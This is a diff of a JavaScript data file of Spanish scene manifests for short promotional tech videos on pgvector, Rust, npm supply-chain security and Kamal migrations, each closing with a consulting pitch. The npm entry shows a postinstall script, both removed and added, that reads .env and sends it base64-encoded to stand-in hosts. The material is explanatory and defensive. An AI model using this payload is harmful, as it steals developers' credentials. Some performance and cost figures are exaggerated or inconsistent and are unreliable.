-                "Si el delete falla en Pinecone, quedan embeddings huérfanos",
-                "Doble factura: Base de datos + Proveedor vectorial",
-                "Latencia añadida entre dos nubes distintas"
-              ]
-            },
-            "termB": {
-              "title": "POSTGRESQL NATIVO (PGVECTOR)",
-              "color": "#10b981",
-              "cmd": "CREATE INDEX USING hnsw (embedding vector_cosine_ops)",
-              "status": "Transacciones ACID nativas",
-              "time": "$0 extra",
-              "lines": [
-                "Un solo respaldo con pg_dump tradicional",
-                "Join directo entre tablas relacionales y embeddings",
-                "Cero sincronizaciones en segundo plano"
-              ]
-            }
+            "header": "SOBRECARGA DE RED EN RAG",
+            "title": "EL ERROR DE FRAGMENTAR TU BASE",
+            "subtitle": "LATENCIA DE RED HTTP VS JOINS EN EL MISMO MOTOR"
           }
         },
         {
-          "id": "cta_pgvector_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la capa de persistencia de tu producto para consolidar tu stack y reducir costes operativos. Agenda tu sesión técnica en el link de la bio.",
-          "visual_cue": "Cierre con auditoría de base de datos",
+          "id": "hnsw_storage",
+          "type": "storage_engine_viz",
+          "duration": 6,
+          "voiceover": "Postgres maneja tus usuarios, tus pagos y tus vectores con consistencia transaccional y backups unificados con pg_dump.",
+          "visual_cue": "Visualizador del motor de almacenamiento HNSW demostrando 99% recall",
           "props": {
-            "header": "AUDITORÍA DE BASES DE DATOS",
-            "title": "SIMPLIFICA TU CAPA DE PERSISTENCIA",
-            "cta": {
-              "badge": "AUDITORÍA DE DATOS (Link en bio)",
-              "text": "Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría."
-            }
+            "mode": "hnsw",
+            "badge": "STACK UNIFICADO",
+            "title": "CERO BASES DE DATOS EXTERNAS",
+            "subtitle": "RELACIONAL + VECTORES EN EL MISMO CLÚSTER ACID"
           }
         }
       ]
@@ -1615,72 +1330,103 @@ window.__BIBLIOTECA_2026__ = [
     "group": "08. RUST SISTEMAS CRITICOS",
     "label": "Var A (Técnico): El Borrow Checker de Rust: Cero fugas de memoria sin GC",
     "variation": "A (Técnico)",
-    "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
+    "category": "LENGUAJES & RENDIMIENTO",
     "manifest": {
       "title": "[08] El Borrow Checker de Rust: Cero fugas de memoria sin GC (Var A)",
-      "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
+      "category": "LENGUAJES & RENDIMIENTO",
       "slug": "08_rust_sistemas_criticos",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "memory_borrow_hook",
-          "type": "memory_layout",
-          "duration": 6.5,
-          "voiceover": "¿Cómo garantizar que un programa nunca tendrá fugas de memoria sin usar un recolector de basura? El Borrow Checker de Rust libera la memoria de forma estática.",
-          "visual_cue": "Apertura directa con layout de memoria Stack vs Heap y liberación sin recolector",
+          "id": "rust_compile_hook",
+          "type": "terminal_split",
+          "duration": 6,
+          "voiceover": "Rust garantiza seguridad de memoria en tiempo de compilación. No hay recolector de basura deteniendo el mundo ni fugas ocultas.",
+          "visual_cue": "Terminal mostrando error del borrow checker atrapando un puntero colgante antes de llegar a prod",
           "props": {
-            "header": "GESTIÓN ESTÁTICA DE MEMORIA",
-            "title": "PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)",
-            "items": [
+            "header": "GARANTÍA EN COMPILACIÓN",
+            "title": "EL BORROW CHECKER EN ACCIÓN",
+            "leftTitle": "COMPILADOR RUSTC",
+            "rightTitle": "GARANTÍA DE MEMORIA",
+            "leftText": "$ cargo check\nerror[E0382]: borrow of moved value: `data`\n  --> src/network.rs:42:18\n  | value moved here, in previous iteration\n✖ El compilador prohíbe data races",
+            "rightText": "• 0 punteros nulos en runtime\n• 0 fugas de memoria sin recolector\n• Rendimiento idéntico a C/C++\n• Aislamiento estricto de hilos"
+          }
+        },
+        {
+          "id": "memory_inspection",
+          "type": "memory_layout",
+          "duration": 6,
+          "voiceover": "Cada valor tiene un único dueño. Cuando la variable sale del ámbito, la memoria se libera inmediatamente en el stack sin pausas de CPU.",
+          "visual_cue": "Inspección de memoria RAM mostrando asignación en stack sin fragmentación de heap",
+          "props": {
+            "badge": "GESTIÓN RAII",
+            "title": "ASIGNACIÓN EN STACK VS HEAP",
+            "rows": [
               {
-                "name": "STACK FRAME ACTIVO",
-                "addr": "0x7fff001",
-                "value": "Buffer asignado y dueño único",
-                "color": "#10b981"
+                "addr": "0x7FFF010",
+                "hex": [
+                  "72",
+                  "75",
+                  "73",
+                  "74",
+                  "5F",
+                  "6F",
+                  "77",
+                  "6E"
+                ],
+                "label": "BUFFER EXCLUSIVO (STACK)"
               },
               {
-                "name": "DROP AUTOMÁTICO EN COMPILACIÓN",
-                "addr": "0x7fff002",
-                "value": "Cero pausas de Garbage Collector (0ns)",
-                "color": "#38bdf8"
+                "addr": "0x7FFF018",
+                "hex": [
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "20"
+                ],
+                "label": "CAPACIDAD (32 BYTES)"
+              },
+              {
+                "addr": "0x7FFF020",
+                "hex": [
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00"
+                ],
+                "label": "LIBERACIÓN AUTOMÁTICA"
               }
             ]
           }
         },
         {
-          "id": "rust_code",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero condiciones de carrera en producción.",
-          "visual_cue": "Terminal mostrando error del borrow checker previniendo una condición de carrera",
-          "props": {
-            "header": "PREVENCIÓN EN COMPILACIÓN",
-            "title": "EL COMPILADOR DEFIENDE TU SISTEMA",
-            "filename": "src/concurrency.rs",
-            "codeLines": [
-              "fn process(shared: &mut Data) {",
-              "  thread::spawn(move || {",
-              "    shared.mutate(); // ERROR E0502: Cannot borrow as mutable",
-              "  });",
-              "  shared.read();",
-              "}"
-            ],
-            "cursorLine": 4
-          }
-        },
-        {
           "id": "cta_rust",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño servicios backend de alto rendimiento y baja latencia en Rust y Go. Si buscas un desarrollador senior para liderar tu sistema, link en mi perfil.",
-          "visual_cue": "Cierre con contratación senior backend",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Optimizo microservicios críticos y migro cuellos de botella a Rust para reducir la latencia p99 a microsegundos. Link en bio para auditar tu backend.",
+          "visual_cue": "Comparativa de latencia de cola p99: Go con GC vs Rust nativo",
           "props": {
-            "header": "CONTRATACIÓN SENIOR / STAFF ENGINEER",
-            "title": "DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA",
-            "cta": {
-              "badge": "STAFF BACKEND DEVELOPER (Link en bio)",
-              "text": "¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio."
+            "header": "CONSULTORÍA EN RUST (Link en bio)",
+            "metricA": {
+              "label": "GO BACKEND (GC PAUSES)",
+              "value": "45.2 ms",
+              "sub": "Picos de latencia en percentil p99",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "RUST NATIVO (ZERO-GC)",
+              "value": "0.48 ms",
+              "sub": "Latencia predecible y uniforme",
+              "color": "#10b981"
             }
           }
         }
@@ -1693,49 +1439,82 @@ window.__BIBLIOTECA_2026__ = [
     "group": "08. RUST SISTEMAS CRITICOS",
     "label": "Var B (Polémico): Por qué Discord y Cloudflare mataron Go y adoptaron Rust",
     "variation": "B (Polémico)",
-    "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
+    "category": "LENGUAJES & RENDIMIENTO",
     "manifest": {
       "title": "[08] Por qué Discord y Cloudflare mataron Go y adoptaron Rust (Var B)",
-      "category": "LENGUAJES DE SISTEMAS & RENDIMIENTO",
+      "category": "LENGUAJES & RENDIMIENTO",
       "slug": "08_rust_sistemas_criticos",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "metric_spike_hook",
-          "type": "metrics_comparison",
-          "duration": 6.5,
-          "voiceover": "Discord tenía millones de usuarios y su servicio en Go se congelaba cada dos minutos por culpa del Garbage Collector. Reescribir en Rust eliminó los picos de latencia.",
-          "visual_cue": "Apertura directa con comparativa gráfica de p99 latency con Garbage Collection vs Rust",
+          "id": "memory_gc_shock",
+          "type": "memory_layout",
+          "duration": 6,
+          "voiceover": "Discord tenía un servicio en Go procesando millones de mensajes. Cada dos minutos, el Garbage Collector congelaba el servicio creando picos de latencia inaceptables.",
+          "visual_cue": "Inspección de memoria con picos de pausa de Garbage Collector en Go",
           "props": {
-            "header": "MÉTRICAS DE RENDIMIENTO REAL",
-            "metricA": {
-              "label": "GO RUNTIME (GC SPIKES)",
-              "value": "180ms p99",
-              "sub": "Picos cada 2 minutos por barrido de memoria",
-              "color": "#ef4444"
-            },
-            "metricB": {
-              "label": "RUST (DETERMINISTIC)",
-              "value": "0.8ms p99",
-              "sub": "Línea completamente plana las 24 horas",
-              "color": "#10b981"
-            }
+            "badge": "COLAPSO POR RECOLECTOR",
+            "title": "EL PROBLEMA DEL GC EN ESCALA",
+            "rows": [
+              {
+                "addr": "0xDEAD010",
+                "hex": [
+                  "FF",
+                  "FF",
+                  "FF",
+                  "FF",
+                  "00",
+                  "00",
+                  "00",
+                  "00"
+                ],
+                "label": "OBJETOS HUÉRFANOS EN HEAP"
+              },
+              {
+                "addr": "0xDEAD018",
+                "hex": [
+                  "53",
+                  "54",
+                  "4F",
+                  "50",
+                  "5F",
+                  "57",
+                  "4F",
+                  "52"
+                ],
+                "label": "PAUSA STOP-THE-WORLD"
+              },
+              {
+                "addr": "0xDEAD020",
+                "hex": [
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "00",
+                  "05",
+                  "00"
+                ],
+                "label": "LATENCIA P99: 1200 MS"
+              }
+            ]
           }
         },
         {
-          "id": "cta_rust_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Construyo software de alto rendimiento y arquitectura sin picos de latencia. Si buscas un lead engineer para tu infraestructura, link en mi biografía.",
-          "visual_cue": "Cierre con contratación senior",
+          "id": "rust_rewrite",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Reescribieron el servicio en Rust. El uso de CPU se desplomó y la latencia pasó de dos segundos a menos de un milisegundo constante. Link en bio para optimizaciones.",
+          "visual_cue": "Terminal mostrando comparativa de métricas tras la migración a Rust",
           "props": {
-            "header": "CONTRATACIÓN SENIOR BACKEND",
-            "title": "SISTEMAS DE BAJA LATENCIA Y ALTO RENDIMIENTO",
-            "cta": {
-              "badge": "LEAD ENGINEER (Contacto en bio)",
-              "text": "Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil."
-            }
+            "header": "OPTIMIZACIÓN DE SISTEMAS (Link en bio)",
+            "title": "MIGRACIÓN DE GO A RUST",
+            "leftTitle": "SERVICIO EN GO",
+            "rightTitle": "SERVICIO EN RUST",
+            "leftText": "CPU: 85% de saturación continua\nLatencia P99: 2.400 ms (GC Spike)\nRAM: 14 GB con fragmentación",
+            "rightText": "CPU: 8% de uso estable\nLatencia P99: 0.35 ms constante\nRAM: 420 MB sin picos ni fugas"
           }
         }
       ]
@@ -1747,86 +1526,60 @@ window.__BIBLIOTECA_2026__ = [
     "group": "09. SEGURIDAD SUPPLY CHAIN",
     "label": "Var A (Técnico): Anatomía de un malware en NPM: Robo de .env en scripts postinstall",
     "variation": "A (Técnico)",
-    "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
+    "category": "CIBERSEGURIDAD & DEVOPS",
     "manifest": {
       "title": "[09] Anatomía de un malware en NPM: Robo de .env en scripts postinstall (Var A)",
-      "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
+      "category": "CIBERSEGURIDAD & DEVOPS",
       "slug": "09_seguridad_supply_chain",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "postinstall_code_hook",
-          "type": "code_terminal",
-          "duration": 6.5,
-          "voiceover": "Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.",
-          "visual_cue": "Apertura directa con terminal mostrando el payload malicioso oculto en package.json",
+          "id": "kernel_intercept_malware",
+          "type": "kernel_sandbox_viz",
+          "duration": 6,
+          "voiceover": "Un simple npm install puede vaciar las variables de entorno de tu servidor si un paquete secuestrado ejecuta un script de postinstall con permisos de red.",
+          "visual_cue": "Visualizador del kernel interceptando llamada al sistema de robo de variables .env",
           "props": {
-            "header": "PAYLOAD DEL ATACANTE",
-            "title": "SCRIPT POSTINSTALL OFUSCADO",
-            "filename": "node_modules/fake-lib/package.json",
+            "badge": "DEFENSA EN PROFUNDIDAD",
+            "title": "INTERCEPCIÓN DE SYSCALLS",
+            "subtitle": "BLOQUEO DE LLAMADAS NO AUTORIZADAS EN POSTINSTALL"
+          }
+        },
+        {
+          "id": "exploit_code",
+          "type": "code_terminal",
+          "duration": 6,
+          "voiceover": "El script malicioso lee tu archivo .env con las claves de AWS y Stripe y las envía codificadas en base sesenta y cuatro a un servidor en el extranjero.",
+          "visual_cue": "Terminal mostrando el código ofuscado dentro del package.json de un paquete comprometido",
+          "props": {
+            "header": "ANATOMÍA DEL EXPLOIT",
+            "title": "OFUSCACIÓN EN PACKAGE.JSON",
+            "filename": "node_modules/fake-pkg/package.json",
             "codeLines": [
-              "\"scripts\": {",
-              "  \"postinstall\": \"node -e \\\"const fs=require('fs'),https=require('https');",
-              "    const env = fs.readFileSync('.env', 'utf8');",
-              "    https.get('https://c2-server.com/leak?d=' + Buffer.from(env).toString('base64'));\\\"\"",
-              "}",
-              "# Las claves de AWS, Stripe y bases de datos quedan expuestas"
+              "  \"scripts\": {",
+              "    \"postinstall\": \"node -e 'require(\"http\").request({",
+              "      hostname: \"leak.evil.io\",",
+              "      path: \"/?k=\" + Buffer.from(fs.readFileSync(\".env\")).toString(\"base64\")",
+              "    }).end();'\"",
+              "  }"
             ],
             "cursorLine": 4
           }
         },
         {
-          "id": "leak_pipe",
-          "type": "network_pipeline",
-          "duration": 6,
-          "voiceover": "El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.",
-          "visual_cue": "Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control",
-          "props": {
-            "header": "EXFILTRACIÓN SILENCIOSA",
-            "title": "FILTRACIÓN DE CLAVES .ENV",
-            "subtitle": "TRÁFICO DE SALIDA SIN BARRERAS DE RED",
-            "stages": [
-              {
-                "id": "dev",
-                "label": "TERMINAL LOCAL",
-                "sub": "npm install ejecutado con permisos completos",
-                "y": 220,
-                "color": "#ef4444",
-                "metric": "Comprometido"
-              },
-              {
-                "id": "network",
-                "label": "EXFILTRACIÓN HTTPS",
-                "sub": "Envío de payload base64 en puerto 443",
-                "y": 520,
-                "color": "#fbbf24",
-                "metric": "Sin bloqueo"
-              },
-              {
-                "id": "c2",
-                "label": "SERVIDOR DEL ATACANTE",
-                "sub": "Extracción de AWS_SECRET_ACCESS_KEY",
-                "y": 820,
-                "color": "#a855f7",
-                "metric": "Claves robadas"
-              }
-            ]
-          }
-        },
-        {
           "id": "cta_security",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.",
-          "visual_cue": "Cierre con auditoría de seguridad de dependencias",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Audito pipelines de CI/CD e implemento políticas Zero-Trust para aislar procesos de build en producción. Link en mi perfil para blindar tu repositorio.",
+          "visual_cue": "Terminal mostrando política de bloqueo de scripts y llamada a la acción",
           "props": {
-            "header": "AUDITORÍA DE SEGURIDAD",
-            "title": "PROTEGE TU CADENA DE SUMINISTRO",
-            "cta": {
-              "badge": "AUDITORÍA DE SEGURIDAD (Link en bio)",
-              "text": "¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline."
-            }
+            "header": "AUDITORÍA DE SEGURIDAD (Link en bio)",
+            "title": "BLINDAJE DE PIPELINE ZERO-TRUST",
+            "leftTitle": "POLÍTICA DE DEPENDENCIAS",
+            "rightTitle": "MEDIDAS APLICADAS",
+            "leftText": "$ npm config set ignore-scripts true\n✔ Scripts postinstall bloqueados por defecto\n✔ Detección de exfiltración de red activa\n✔ Secretos en memoria aislados con vaults",
+            "rightText": "• Audita dependencias transitivas\n• Protege credenciales de AWS y Stripe\n• Cero ejecución arbitraria en builds\n• Contacto para auditoría: link en bio"
           }
         }
       ]
@@ -1838,69 +1591,39 @@ window.__BIBLIOTECA_2026__ = [
     "group": "09. SEGURIDAD SUPPLY CHAIN",
     "label": "Var B (Polémico): GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust",
     "variation": "B (Polémico)",
-    "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
+    "category": "CIBERSEGURIDAD & DEVOPS",
     "manifest": {
       "title": "[09] GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust (Var B)",
-      "category": "CIBERSEGURIDAD & SUPPLY CHAIN",
+      "category": "CIBERSEGURIDAD & DEVOPS",
       "slug": "09_seguridad_supply_chain",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "zerotrust_hook",
-          "type": "kinetic_hook",
-          "duration": 4.5,
-          "voiceover": "GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.",
-          "visual_cue": "Tipografía cinética de impacto para ciberseguridad",
-          "props": {
-            "layout": "impact",
-            "badge": "DEFENSA EN CI/CD",
-            "lines": [
-              {
-                "text": "BLINDA TU PIPELINE",
-                "color": "#ffffff"
-              },
-              {
-                "text": "CON ZERO-TRUST",
-                "color": "#10b981"
-              }
-            ],
-            "subtitle": "Bloqueo estricto de scripts no autorizados"
-          }
-        },
-        {
-          "id": "sandbox_terminal",
-          "type": "code_terminal",
+          "id": "attack_demo",
+          "type": "terminal_split",
           "duration": 6,
-          "voiceover": "Con la bandera ignore-scripts y aislación en sandboxes efímeros, neutralizas cualquier ataque antes de que pueda tocar tus archivos locales.",
-          "visual_cue": "Terminal configurando npm config set ignore-scripts true",
+          "voiceover": "Si tu pipeline corre npm install sin la bandera ignore-scripts, estás a un paquete comprometido de perder el control total de tu infraestructura.",
+          "visual_cue": "Terminal mostrando ataque simulado y cómo la bandera ignore-scripts lo neutraliza",
           "props": {
-            "header": "CONFIGURACIÓN DEFENSIVA",
-            "title": "POLÍTICAS DE INSTALACIÓN SEGURA",
-            "filename": ".npmrc",
-            "codeLines": [
-              "# Desactiva ejecución arbitraria de scripts en dependencias:",
-              "ignore-scripts=true",
-              "audit=true",
-              "engine-strict=true",
-              "# Si un paquete requiere compilar binarios, debe ser autorizado manualmente"
-            ],
-            "cursorLine": 4
+            "header": "VECTOR DE ATAQUE EN CI/CD",
+            "title": "EJECUCIÓN ARBITRARIA EN BUILD",
+            "leftTitle": "PIPELINE VULNERABLE",
+            "rightTitle": "PIPELINE BLINDADO",
+            "leftText": "$ npm install\nRunning postinstall script...\n✖ Exfiltrando .env a servidor remoto\n✖ Credenciales comprometidas en 0.8s",
+            "rightText": "$ npm ci --ignore-scripts\n✔ Postinstall ignorado por completo\n✔ 0 llamadas salientes a internet\n✔ Repositorio 100% blindado"
           }
         },
         {
-          "id": "cta_security_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Audito la postura de seguridad de tu infraestructura y configuro entornos blindados contra fugas de datos. Agenda en mi perfil.",
-          "visual_cue": "Cierre con auditoría de ciberseguridad",
+          "id": "kernel_defense",
+          "type": "kernel_sandbox_viz",
+          "duration": 5.5,
+          "voiceover": "Bloquea los scripts por defecto y aísla el entorno de build con contenedores sin acceso a internet saliente. Link en mi bio para auditar tu pipeline.",
+          "visual_cue": "Visualizador del kernel impidiendo conexiones salientes no autorizadas",
           "props": {
-            "header": "AUDITORÍA DE CIBERSEGURIDAD",
-            "title": "ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE",
-            "cta": {
-              "badge": "AUDITORÍA DE SEGURIDAD (Link en perfil)",
-              "text": "Protege tus credenciales y entorno productivo. Link directo en mi perfil."
-            }
+            "badge": "ZERO-TRUST NETWORKING",
+            "title": "AISLAMIENTO DE PROCESO DE BUILD",
+            "subtitle": "BLOQUEO DE CONEXIONES EXTERNAS NO PERMITIDAS"
           }
         }
       ]
@@ -1912,82 +1635,61 @@ window.__BIBLIOTECA_2026__ = [
     "group": "10. EXODO BARE METAL KAMAL",
     "label": "Var A (Técnico): Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes",
     "variation": "A (Técnico)",
-    "category": "INFRAESTRUCTURA & CLOUD COSTS",
+    "category": "DEVOPS & CLOUD",
     "manifest": {
       "title": "[10] Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes (Var A)",
-      "category": "INFRAESTRUCTURA & CLOUD COSTS",
+      "category": "DEVOPS & CLOUD",
       "slug": "10_exodo_bare_metal_kamal",
       "variation": "A",
       "fps": 30,
       "scenes": [
         {
-          "id": "kamal_flow_hook",
-          "type": "architecture_flow",
+          "id": "kamal_stepper_hook",
+          "type": "migration_stepper_viz",
           "duration": 6.5,
-          "voiceover": "¿Cómo desplegar con cero tiempo de inactividad sin la pesadilla de Kubernetes? Kamal levanta el nuevo contenedor, valida la salud y conmuta el tráfico en milisegundos.",
-          "visual_cue": "Apertura directa con arquitectura de conmutación de tráfico con proxy",
+          "voiceover": "No necesitas un clúster de Kubernetes de tres mil dólares para tener despliegues con cero tiempo de inactividad. Kamal lo hace con Docker en servidores económicos.",
+          "visual_cue": "Visualizador de fases de despliegue rolling zero-downtime con Kamal y Traefik",
           "props": {
-            "header": "MECANISMO DE DESPLIEGUE",
-            "title": "ROLLING RESTART CON TRAEFIK",
-            "nodes": [
-              {
-                "id": "proxy",
-                "label": "TRAEFIK PROXY REVERSE",
-                "sublabel": "Manejo automático de certificados SSL y rutas",
-                "color": "#38bdf8",
-                "y": 160
-              },
-              {
-                "id": "app_new",
-                "label": "NUEVO CONTENEDOR (V2)",
-                "sublabel": "Health check verificado en localhost:8001",
-                "color": "#10b981",
-                "y": 520
-              },
-              {
-                "id": "app_old",
-                "label": "CONTENEDOR ANTIGUO (V1)",
-                "sublabel": "Drenado suave de conexiones activas",
-                "color": "#71717a",
-                "y": 880
-              }
-            ]
+            "badge": "DESPLIEGUE ZERO-DOWNTIME",
+            "title": "KAMAL ROLLING DEPLOY",
+            "subtitle": "TRANSICIÓN DE CONTENEDORES SIN PERDER PETICIONES"
           }
         },
         {
-          "id": "kamal_deploy",
-          "type": "code_terminal",
-          "duration": 6,
-          "voiceover": "Todo se configura en un simple archivo YAML. Un comando en tu terminal y tu aplicación queda en producción en tus propios servidores.",
-          "visual_cue": "Terminal ejecutando kamal deploy con salida de docker tags",
+          "id": "metrics_cost_kamal",
+          "type": "metrics_comparison",
+          "duration": 5.5,
+          "voiceover": "Mudas tu infraestructura de AWS a servidores Hetzner de alto rendimiento y pasas de pagar miles de dólares al mes a menos de doscientos.",
+          "visual_cue": "Comparativa de costos: Clúster EKS de AWS vs Servidor Hetzner con Kamal",
           "props": {
-            "header": "CONFIGURACIÓN DECLARATIVA",
-            "title": "DEPLOY CON UN SOLO COMANDO",
-            "filename": "config/deploy.yml",
-            "codeLines": [
-              "service: api-core",
-              "image: registry.gitlab.com/app/api",
-              "servers:",
-              "  web:",
-              "    - 159.69.10.42 # Servidor Hetzner $40/mo",
-              "kamal deploy # Completado en 24 segundos con 0s downtime"
-            ],
-            "cursorLine": 5
+            "header": "AHORRO EN INFRAESTRUCTURA CLOUD",
+            "metricA": {
+              "label": "AWS EKS + NAT GATEWAYS",
+              "value": "$4.850 / mes",
+              "sub": "Control plane · Load Balancers · Tráfico",
+              "color": "#ef4444"
+            },
+            "metricB": {
+              "label": "HETZNER DEDICADO + KAMAL",
+              "value": "$180 / mes",
+              "sub": "64 núcleos AMD · 128 GB RAM · NVMe",
+              "color": "#10b981"
+            }
           }
         },
         {
           "id": "cta_kamal",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Si tu empresa quema dinero en AWS y quieres migrar a una infraestructura simple en servidores dedicados, te asesoro en el proceso. Link en mi perfil.",
-          "visual_cue": "Cierre con auditoría y migración cloud",
+          "type": "terminal_split",
+          "duration": 5.5,
+          "voiceover": "Ayudo a startups a migrar de la nube inflada a servidores dedicados con Kamal sin perder disponibilidad. Enlace en mi perfil para auditar tus servidores.",
+          "visual_cue": "Terminal ejecutando kamal deploy con éxito y llamada a la acción en bio",
           "props": {
-            "header": "MIGRACIÓN & AUDITORÍA CLOUD",
-            "title": "REDUCE FACTURA HASTA UN 80%",
-            "cta": {
-              "badge": "AUDITORÍA CLOUD (Link en bio)",
-              "text": "¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil."
-            }
+            "header": "MIGRACIÓN CLOUD (Link en bio)",
+            "title": "DESPLIEGUE SENCILLO Y RENTABLE",
+            "leftTitle": "KAMAL DEPLOY EN ACCIÓN",
+            "rightTitle": "RESULTADO DE MIGRACIÓN",
+            "leftText": "$ kamal deploy\n✔ Subiendo imagen Docker a servidor...\n✔ Iniciando nuevo contenedor en puerto 3001\n✔ Traefik redirige el tráfico (0s downtime)\n✔ Deteniendo contenedor antiguo",
+            "rightText": "• Reduce el 90% de tu factura mensual\n• Control total sobre tu hardware\n• Cero dolores de cabeza con K8s\n• ¿Evaluamos tu caso? Enlace en perfil"
           }
         }
       ]
@@ -1999,62 +1701,46 @@ window.__BIBLIOTECA_2026__ = [
     "group": "10. EXODO BARE METAL KAMAL",
     "label": "Var B (Polémico): De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner",
     "variation": "B (Polémico)",
-    "category": "INFRAESTRUCTURA & CLOUD COSTS",
+    "category": "DEVOPS & CLOUD",
     "manifest": {
       "title": "[10] De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner (Var B)",
-      "category": "INFRAESTRUCTURA & CLOUD COSTS",
+      "category": "DEVOPS & CLOUD",
       "slug": "10_exodo_bare_metal_kamal",
       "variation": "B",
       "fps": 30,
       "scenes": [
         {
-          "id": "hetzner_split_hook",
-          "type": "terminal_split",
-          "duration": 6.5,
-          "voiceover": "Empresas como 37signals abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.",
-          "visual_cue": "Apertura directa con terminal comparando factura mensual de AWS frente a servidor dedicado",
+          "id": "exodus_metrics",
+          "type": "metrics_comparison",
+          "duration": 6,
+          "voiceover": "Las grandes nubes te cobran por cada gigabyte transferido y cada balanceador levantado. Con un servidor dedicado en Hetzner obtienes diez veces más potencia por una fracción del precio.",
+          "visual_cue": "Métricas de ahorro masivo de infraestructura",
           "props": {
-            "header": "COMPARATIVA DE HARDWARE Y COSTES",
-            "title": "VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER",
-            "termA": {
-              "title": "AWS CLOUD (EKS + RDS + NAT)",
-              "color": "#ef4444",
-              "cmd": "aws billing get-monthly-forecast",
-              "status": "Facturación por cada gigabyte transferido",
-              "time": "$14,800/mes",
-              "lines": [
-                "CPU compartida con vecinos ruidosos",
-                "Coste por transferencia de datos: $0.09 por GB",
-                "Complejidad: 40 servicios conectados en consola"
-              ]
+            "header": "EL ÉXODO DE LA NUBE EN 2026",
+            "metricA": {
+              "label": "FACTURA TÍPICA AWS",
+              "value": "$14.800",
+              "sub": "Servicios inflados y tráfico de red",
+              "color": "#ef4444"
             },
-            "termB": {
-              "title": "HETZNER DEDICATED SERVER",
-              "color": "#10b981",
-              "cmd": "lscpu && free -h",
-              "status": "AMD EPYC 32 Cores · 128GB DDR5 RAM · 2x 2TB NVMe",
-              "time": "$190/mes",
-              "lines": [
-                "100% de la CPU física dedicada a tu app",
-                "Tráfico ilimitado a 1 Gbps incluido",
-                "Despliegues sencillos con Docker y Kamal"
-              ]
+            "metricB": {
+              "label": "HETZNER BARE METAL",
+              "value": "$220",
+              "sub": "Tráfico ilimitado · Hardware dedicado",
+              "color": "#10b981"
             }
           }
         },
         {
-          "id": "cta_kamal_b",
-          "type": "tradeoff_matrix",
-          "duration": 5,
-          "voiceover": "Diseño planes de migración a bare-metal para recortar costes y multiplicar la velocidad de tu backend. Hablemos en el enlace de mi perfil.",
-          "visual_cue": "Cierre con auditoría de infraestructura",
+          "id": "kamal_rollout",
+          "type": "migration_stepper_viz",
+          "duration": 5.5,
+          "voiceover": "Con herramientas como Kamal despliegas con un solo comando desde tu terminal manteniendo cero caídas en producción. Link en bio para auditar tu nube.",
+          "visual_cue": "Visualizador del flujo de despliegue en servidor bare metal",
           "props": {
-            "header": "PLAN DE MIGRACIÓN BARE-METAL",
-            "title": "AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA",
-            "cta": {
-              "badge": "AUDITORÍA DE COSTES (Link en perfil)",
-              "text": "¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan."
-            }
+            "badge": "SIMPLICIDAD OPERATIVA",
+            "title": "BARE METAL EN PRODUCCIÓN",
+            "subtitle": "DOCKER + TRAEFIK ORQUESTADO POR KAMAL"
           }
         }
       ]
@@ -2075,63 +1761,86 @@ window.__BIBLIOTECA_2026__ = [
       "fps": 30,
       "scenes": [
         {
-          "id": "quant_memory_hook",
-          "type": "memory_layout",
+          "id": "quant_weights_lead",
+          "type": "quantization_weights_viz",
           "duration": 6.5,
           "voiceover": "¿Cómo comprimir un modelo de inteligencia artificial de treinta gigabytes para que corra en tu servidor local? Pasando de coma flotante a enteros de cuatro bits con cuantización.",
